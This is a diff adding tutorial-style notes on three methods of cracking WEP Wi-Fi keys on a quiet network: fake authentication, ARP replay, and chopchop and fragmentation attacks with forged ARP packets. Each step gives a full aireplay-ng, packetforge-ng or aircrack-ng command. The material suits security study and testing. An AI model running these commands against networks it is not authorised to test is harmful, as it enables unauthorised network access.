@@ -96,11 +96,37 @@ This IV is sent in plain text with the packet for the receiver to decrypt it, an
 
 ### NOT Busy Network
 
+#### Method 1
+
+* Sniff the packets on the target network
 * Associate with the target network (tell the network that I want to connect to it)
-* Fake Auth (Associate)
   * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
 * Packet Injection
   * `aireplay-ng --arpreplay -b <network bssid> -h <wireless adapter MAC> wlan0mon`
+* Crack the key
+  * `aircrack-ng <.cap file>`
+
+#### Method 2
+
+* Sniff the packets on the target network
+* Associate with the target network
+* Capture packets and determine its keystream
+  * `aireplay-ng --chopchop -b <network bssid> -h <wireless adapter MAC> wlan0mon`
+* Forge a fake packet
+  * `packetforge-ng --arp -a <network bssid> -h <wireless adapter MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <forged packets file name>`
+* Inject fake packets
+  * `aireplay-ng --arpreplay -r <forged packets file name> wlan0mon`
+
+#### Method 3
+
+* Sniff the packets on the target network
+* Associate with the target network
+* Obtain PRGA
+  * `aireplay-ng --fragment -b <network bssid> -h <wireless adapter MAC> wlan0mon`
+* Forge a fake packet
+  * `packetforge-ng --arp -a <network bssid> -h <wireless adapter MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <forged packets file name>`
+* Inject fake packets
+  * `aireplay-ng --arpreplay -r <forged packets file name> wlan0mon`
 
 ## Crack WPA/WPA2
 
